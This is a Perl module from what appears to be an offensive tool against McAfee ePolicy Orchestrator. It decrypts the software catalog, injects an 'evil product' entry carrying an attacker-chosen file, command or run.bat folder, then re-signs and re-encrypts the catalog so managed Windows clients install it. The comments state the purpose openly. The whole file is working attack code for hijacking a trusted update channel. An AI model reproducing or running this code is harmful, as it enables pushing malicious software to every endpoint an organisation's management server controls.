package Epowner::Epo;

use Epowner::Cab::Cab;
use Epowner::CabSign::CabSign;

use File::Path;
use Time::Piece;

use strict;
use warnings;




#============================================================#
# Catalog : From XML to Cab file                             #
#============================================================#
sub catalog_makecab {

	my $this = shift;

	my $xmlfile = $this->{catalog_tmp_folder} . '/' . $this->{catalog_xml_file} ;
	my $cabfile = $this->{catalog_tmp_folder} . '/' . $this->{catalog_cab_file} ;

	# Generate CAB file
	my $cab = Epowner::Cab::Cab->new($this->{lcab_path}, $this->{cabextract_path});
	$cab->makecab($xmlfile, $cabfile, 1);
}

#============================================================#
# Catalog : From CAB to XML                                  #
#============================================================#
sub catalog_extract {

        my $this = shift;


        my $xmlfile = $this->{catalog_tmp_folder} . '/' . $this->{catalog_xml_file} ;
        my $cabfile = $this->{catalog_tmp_folder} . '/' . $this->{catalog_signedcab_file} ;

        # Extract CAB file
        my $cab = Epowner::Cab::Cab->new($this->{lcab_path}, $this->{cabextract_path});
        $cab->extractcab($cabfile, $xmlfile);
}


#============================================================#
# Catalog : Sign Cab file                                    #
#============================================================#
sub catalog_signcab {

	my $this = shift;

	# filenames (catalog)
        my $cabfile = $this->{catalog_tmp_folder} . '/' . $this->{catalog_cab_file} ;
        my $signedcabfile = $this->{catalog_tmp_folder} . '/' .  $this->{catalog_signedcab_file} ;
	
	# filename (keys)
	my $dsa_pub  =  $this->{catalog_dsa_folder} . '/' . $this->{catalog_dsa_pub_file} ;
	my $dsa_priv =  $this->{catalog_dsa_folder} . '/' . $this->{catalog_dsa_priv_file} ;
	my $rsa_pub  =  $this->{catalog_rsa_folder} . '/' . $this->{catalog_rsa_pub_file} ;
	my $rsa_priv =  $this->{catalog_rsa_folder} . '/' . $this->{catalog_rsa_priv_file} ;

	
	my $cabsign = Epowner::CabSign::CabSign->new;
	
	# Crypto keys
	$cabsign->load_dsa_pub_from_file( $dsa_pub);
	$cabsign->load_dsa_priv_from_file($dsa_priv);
	$cabsign->load_rsa_priv_from_file($rsa_priv);
	$cabsign->load_rsa_pub_from_file($rsa_pub);

	# sign CAB file
	$cabsign->read_cabfile($cabfile);
	$cabsign->sign_cab();
	$cabsign->write_cabfile_signed($signedcabfile);
	
}

#============================================================#
# Catalog : From SignedCab to catalog.z                      #
#============================================================#
sub catalog_encrypt {

	my $this = shift;

        my $signedcab = $this->{catalog_tmp_folder} . '/' . $this->{catalog_signedcab_file} ;
        my $catalog_z = $this->{catalog_tmp_folder} . '/' . $this->{catalog_z_file} ;

	# Read Signed CAB
	my $buf ='';
	open FILE, "$signedcab" or die "Couldn't open $signedcab: $!";
	while (<FILE>){ $buf .= $_; }
	close FILE;

        my $enc = mcafee_3des_encrypt(
		$buf,				# to encrypt
		sha1_hex($this->{des3_symkey})  # 3DES key in hex
	);

	# Write
	open FILE, ">$catalog_z" or die "Couldn't open $catalog_z: $!";
	print FILE $enc;
	close FILE;
}


#============================================================#
# Catalog : From catalog.z to Signed cab file                #
#============================================================#
sub catalog_decrypt {

        my $this = shift;

        my $cab = $this->{catalog_tmp_folder} . '/' . $this->{catalog_signedcab_file} ;
        my $catalog_z = $this->{catalog_tmp_folder} . '/' . $this->{catalog_z_file} ;

        # Read catalog.z
        my $buf ='';
        open FILE, "$catalog_z" or die "Couldn't open $catalog_z: $!";
        while (<FILE>){ $buf .= $_; }
        close FILE;

        my $dec = mcafee_3des_decrypt(
                $buf,                           # to decrypt
                sha1_hex($this->{des3_symkey})  # 3DES key in hex
        );

        # Write
        open FILE, ">$cab" or die "Couldn't open $cab: $!";
        print FILE $dec;
        close FILE;
}



#============================================================#
# Catalog : Add a new product in catalog.xml                 #
#============================================================#
sub catalog_xml_add_product {

	my $this = shift;
	my $action = shift;	#DEPLOY_FILE,  DEPLOY_CMD or DEPLOY_CUSTOM

	my $evil_local_path;
	my $cmd;
	my $custom_folder;
	my $total_sizeKb =0;

	if($action eq DEPLOY_FILE){
		$evil_local_path = shift;    # the file we want to deploy on clients 
		# is evil file exists ?
		if(not -f $evil_local_path){
			print_err "[-] ERROR: (write_pkgcatalog_xml): file '$evil_local_path' not found\n";
			exit;
		}
		# get evil file size
		my $evil_size = -s $evil_local_path ;
		$total_sizeKb += int($evil_size / 1024);
	}elsif ($action eq DEPLOY_CMD){
		$cmd = shift;	
	}elsif ($action eq DEPLOY_CUSTOM){
		$custom_folder = shift;

		# read custom folder dir
		opendir DIR, $custom_folder or die "[-] ERROR (catalog_xml_add_product): can't open '$custom_folder' directory\n";
	        my @files = readdir(DIR);
        	close DIR;

        	# for each entry; add size in Kb
        	foreach my $entry (@files){
                	next if $entry =~ /^\.$|^\.\.$|^run.bat$/;
			my $size = -s $custom_folder . "/" .$entry ;
			$total_sizeKb += int($size / 1024);
		}
	
	}

        my $signing_key_hash = shift;   # which RSA key are used to sign the CAB file

	my $magic = "dcdd61260ffc0b282979b0a0e2047e8dfcdb57d1";	# we use a tag in the new catalog.xml file to check if we already modified that file 
								# during a previous session.
								# If we find that tag, we will first remove the previous Product from the list.. 
								# for your knowledge, this tag is equal to 'sha1(epowned)' 

        # get run.bat file size
        my $run_size = -s $this->{deploy_run_bat} ;
        $total_sizeKb += int($run_size / 1024);


	# evil product info
        my $product_id = $this->{deploy_evil_product_id};
        my $product_name = lc($product_id);

	# evil product XML content
	my $product_xml_entry = << "EOF";
  <!-- begin:$magic -->
  <ProductPackage>
    <ProductDetection Version="3.7.0.18" Branch="Current">
      <DetectionScript>
        <Name>foo.McS</Name>
        <Size>84</Size>
        <DateTime>1CAE83C1B4F3CE0</DateTime>
        <Hash>0DA7D44161661916B8E2F49CDC39C1543B7FDCE0</Hash>
      </DetectionScript>
      <ProductVersion>$this->{deploy_evil_product_version}</ProductVersion>
      <PlatformID>WNTW:4:0:4|WNTS:4:0:4|W2KW|W2KS|W2KAS|W2KDC|WXPW|WXPS|WXPHE|WVST|WVSTS|WNT7W</PlatformID>
    </ProductDetection>
    <ProductID>$this->{deploy_evil_product_id}</ProductID>
    <ProductName>$product_name</ProductName>
    <ConflictSoftwareList/>
    <LangPackage Branch="Current" Version="20110430080658">
      <CheckInDate>20121007033624</CheckInDate>
      <ProductName>$product_name</ProductName>
      <Priority>1</Priority>
      <PackageType>Install</PackageType>
      <LangID>0409</LangID>
      <TotalSize>$total_sizeKb</TotalSize>
      <ExtraSettings>
        <Setting Name="BuildNumber">$this->{deploy_evil_product_build}</Setting>
      </ExtraSettings>
      <SigningKeyHash>$signing_key_hash</SigningKeyHash>
    </LangPackage>
  </ProductPackage>
  <!-- end:$magic -->
EOF



	# read current catalog XML file
	my $xml_file = $this->{catalog_tmp_folder} . "/" . $this->{catalog_xml_file};
        my $xml_content ='';
        open FILE, "$xml_file" or die "Couldn't open $xml_file for reading: $!";
	read (FILE, $xml_content, -s FILE);
        close FILE;


	# Extract Catalog version (<Catalog Version="20130108020230">)
	my $catalog_version = $xml_content;
	$catalog_version =~ s/\n//g;
	$catalog_version =~ s/\r//g;
	$catalog_version =~ s/.*<Catalog Version="([0-9]+)">.*/$1/;
	# catalog_version = 20130108020230


	#print "DEBUG: current version : $catalog_version \n";
	
	# Convert version to time and increment version
	my $time = Time::Piece->strptime($catalog_version, "%Y%m%d%H%M%S");
	$time++;
	my $catalog_version_new = $time->strftime("%Y%m%d%H%M%S");

	#print "DEBUG: new version : $catalog_version_new \n";


	# check if we already add a product in that catalog file (previous session)
	if($xml_content =~ /$magic/){
		print "[*] Previous evil product found in the catalog. Removing it ...\n";

		my $magic_pos_begin = index($xml_content, "<!-- begin:$magic -->");
		my $magic_pos_end   = index($xml_content, "<!-- end:$magic -->") + length("<!-- end:$magic -->");

		$xml_content = 
			substr($xml_content,0, $magic_pos_begin) . # before magic
			substr($xml_content,$magic_pos_end) ; 	   # after magic
	}


	# find the first product in catalog.xml
	my $pos = index($xml_content, "<ProductPackage>");

	# create new catalog.xml content
	my $xml_content_new =
		"<Catalog Version=\"$catalog_version_new\">\n" .  # new version
		$product_xml_entry .				  # our own <ProductPackage>...</ProductPackage>
		substr($xml_content, $pos);	   		  # rest of the file


	# save the new catalog.xml
	open FILE, ">$xml_file" or die "Couldn't open $xml_file for writing: $!";	
	print FILE $xml_content_new ;
	close FILE;


	# return the new catalog version
	return $catalog_version_new;

}


1;
